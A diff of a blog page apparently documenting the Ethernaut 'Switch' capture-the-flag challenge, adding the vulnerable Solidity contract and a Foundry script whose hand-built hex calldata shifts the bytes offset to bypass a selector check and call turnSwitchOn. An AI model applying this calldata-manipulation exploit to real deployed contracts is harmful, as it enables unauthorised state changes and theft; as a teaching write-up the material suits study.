@@ -12,7 +12,9 @@
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
 
   <title>Switch – jfrancai</title>
-  <meta name="description" content="coming soon" />
+  <meta name="description" content="Just have to flip the switch. Can’t be that hard, right?
+Things that might help: Understanding how CALLDATA is encoded.
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Switch { bool public switchOn; // switch is off bytes4 public offSelector = bytes4(keccak256(&#34;turnSwitchOff()&#34;)); modifier onlyThis() { require(msg.sender == address(this), &#34;Only the contract can call this&#34;); _; } modifier onlyOff() { // we use a complex data type to put in memory bytes32[1] memory selector; // check that the calldata at position 68 (location of _data) assembly { calldatacopy(selector, 68, 4) // grab function selector from calldata } require( selector[0] == offSelector, &#34;Can only call the turnOffSwitch function&#34; ); _; } function flipSwitch(bytes memory _data) public onlyOff { (bool success, ) = address(this)." />
 
   
 
@@ -407,14 +409,6 @@
   >Gatekeeper-Three
     </a>
               
-            </li><li class="flex flex-col "><a
-    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
-      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
-    href="/projects/ethernaut/gatekeepper-three-5c1ce9c7f1414b5fb252ec899aa78e83/"
-    
-  >Gatekeepper-Three
-    </a>
-              
             </li><li class="flex flex-col open"><a
     class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
       sidebar-active-item bg-primary-100 font-semibold text-primary-800 contrast-more:border contrast-more:border-primary-500 dark:bg-primary-400/10 dark:text-primary-600 contrast-more:dark:border-primary-500"
@@ -422,6 +416,14 @@
     
   >Switch
     </a>
+  
+    <ul class='flex flex-col gap-1 relative before:absolute before:inset-y-1 before:w-px before:bg-gray-200 before:content-[""] dark:before:bg-neutral-800 ltr:pl-3 ltr:before:left-0 rtl:pr-3 rtl:before:right-0 ltr:ml-3 rtl:mr-3'><li>
+              <a
+                href="#"
+                class="flex rounded px-2 py-1.5 text-sm transition-colors [word-break:break-word] cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:border gap-2 before:opacity-25 before:content-['#'] text-gray-500 hover:bg-gray-100 hover:text-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:text-gray-900 contrast-more:dark:text-gray-50 contrast-more:border-transparent contrast-more:hover:border-gray-900 contrast-more:dark:hover:border-gray-50"
+              ></a>
+            </li>
+          </ul>
   
               
             </li></ul>
@@ -465,6 +467,14 @@
     href="/projects/node-guardians/poly-network-rekt-b7b8b11820c249bcb1f96a50fc20d478/"
     
   >Poly Network Rekt
+    </a>
+              
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/-61a4943358404673845deaa0e7258853/"
+    
+  >_index
     </a>
               
             </li></ul>
@@ -722,14 +732,6 @@
   >Gatekeeper-Three
     </a>
               
-            </li><li class="flex flex-col "><a
-    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
-      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
-    href="/projects/ethernaut/gatekeepper-three-5c1ce9c7f1414b5fb252ec899aa78e83/"
-    
-  >Gatekeepper-Three
-    </a>
-              
             </li><li class="flex flex-col open"><a
     class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
       sidebar-active-item bg-primary-100 font-semibold text-primary-800 contrast-more:border contrast-more:border-primary-500 dark:bg-primary-400/10 dark:text-primary-600 contrast-more:dark:border-primary-500"
@@ -780,6 +782,14 @@
   >Poly Network Rekt
     </a>
               
+            </li><li class="flex flex-col "><a
+    class="flex items-center justify-between gap-2 cursor-pointer rounded px-2 py-1.5 text-sm transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      text-gray-500 hover:bg-gray-100 hover:text-gray-900 contrast-more:border contrast-more:border-transparent contrast-more:text-gray-900 contrast-more:hover:border-gray-900 dark:text-neutral-400 dark:hover:bg-primary-100/5 dark:hover:text-gray-50 contrast-more:dark:text-gray-50 contrast-more:dark:hover:border-gray-50"
+    href="/projects/node-guardians/-61a4943358404673845deaa0e7258853/"
+    
+  >_index
+    </a>
+              
             </li></ul>
       </div></li>
         
@@ -799,8 +809,12 @@
 </div></div></aside>
     
 <nav class="hextra-toc order-last hidden w-64 shrink-0 xl:block print:hidden px-4" aria-label="table of contents">
-    <div class="hextra-scrollbar sticky top-16 overflow-y-auto pr-4 pt-6 text-sm [hyphens:auto] max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:-mr-4 rtl:-ml-4">
-      <div class=" sticky bottom-0 flex flex-col items-start gap-2 pb-8 dark:border-neutral-800 contrast-more:border-t contrast-more:border-neutral-400 contrast-more:shadow-none contrast-more:dark:border-neutral-400">
+    <div class="hextra-scrollbar sticky top-16 overflow-y-auto pr-4 pt-6 text-sm [hyphens:auto] max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:-mr-4 rtl:-ml-4"><p class="mb-4 font-semibold tracking-tight">On this page</p><ul>
+      <li class="my-2 scroll-my-6 scroll-py-6">
+        <a class="ltr:pl-4 rtl:pr-4 inline-block text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-300 contrast-more:text-gray-900 contrast-more:underline contrast-more:dark:text-gray-50 w-full break-words" href="#things-that-might-help">Things that might help:
+        </a>
+      </li></ul>
+      <div class="mt-8 border-t bg-white pt-8 shadow-[0_-12px_16px_white] dark:bg-dark dark:shadow-[0_-12px_16px_#111] sticky bottom-0 flex flex-col items-start gap-2 pb-8 dark:border-neutral-800 contrast-more:border-t contrast-more:border-neutral-400 contrast-more:shadow-none contrast-more:dark:border-neutral-400">
         <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="transition-all transition duration-75 opacity-0 text-xs font-medium text-gray-500 hover:text-gray-900 dark:text-gray-400 dark:hover:text-gray-100 contrast-more:text-gray-800 contrast-more:dark:text-gray-50">
           <span>Scroll to top</span>
           <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="inline ml-1 h-3.5 w-3.5 border rounded-full border-gray-500 hover:border-gray-900 dark:border-gray-400 dark:hover:border-gray-100 contrast-more:border-gray-800 contrast-more:dark:border-gray-50">
@@ -826,7 +840,115 @@
         <div class="content">
           <h1>Switch</h1>
           <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">
-<p>coming soon</p>
+<p>Just have to flip the switch. Can&rsquo;t be that hard, right?</p>
+<h3>Things that might help:<span class="absolute -mt-20" id="things-that-might-help"></span>
+    <a href="#things-that-might-help" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Understanding how <code>CALLDATA</code> is encoded.</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Switch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="k">public</span> <span class="n">switchOn</span><span class="p">;</span> <span class="c1">// switch is off
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">bytes4</span> <span class="k">public</span> <span class="n">offSelector</span> <span class="o">=</span> <span class="kt">bytes4</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;turnSwitchOff()&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     <span class="kd">modifier</span> <span class="nf">onlyThis</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;Only the contract can call this&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">onlyOff</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// we use a complex data type to put in memory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bytes32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">memory</span> <span class="nb">selector</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// check that the calldata at position 68 (location of _data)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">assembly</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">calldatacopy</span><span class="p">(</span><span class="n">selector</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="c1">// grab function selector from calldata
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">require</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">selector</span><span class="err">[</span><span class="mi">0</span><span class="err">]</span> <span class="err">==</span> <span class="n">offSelector</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;Can only call the turnOffSwitch function&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_</span><span class="err">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flipSwitch</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="n">onlyOff</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="n">_data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;call failed :(&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">turnSwitchOn</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyThis</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">switchOn</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">turnSwitchOff</span><span class="p">()</span> <span class="k">public</span> <span class="n">onlyThis</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">switchOn</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>Solution:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Switch</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#39;../src/29.sol&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">deployerPrivateKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;INSTANCE_29&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">deployerPrivateKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Switch</span> <span class="n">s</span> <span class="o">=</span> <span class="n">Switch</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#39;switchOn : %s&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">switchOn</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Default
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 30c13ade
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 0000000000000000000000000000000000000000000000000000000000000020 0 // point to 20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 0000000000000000000000000000000000000000000000000000000000000004 20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 20606e1500000000000000000000000000000000000000000000000000000000 40
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Hacked
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 30c13ade
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 0000000000000000000000000000000000000000000000000000000000000060 0  // point to 60
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 0000000000000000000000000000000000000000000000000000000000000004 20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 20606e1500000000000000000000000000000000000000000000000000000000 40 // skipped
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 0000000000000000000000000000000000000000000000000000000000000004 60
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// 76227e1200000000000000000000000000000000000000000000000000000000 80 // actually called
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">payload</span> <span class="o">=</span> <span class="s">hex&#34;30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">s</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#39;switchOn : %s&#39;</span><span class="p">,</span> <span class="n">s</span><span class="p">.</span><span class="n">switchOn</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>larz  et nadia remi romain</p>
 
         </div>
         <div class="mt-16"></div>
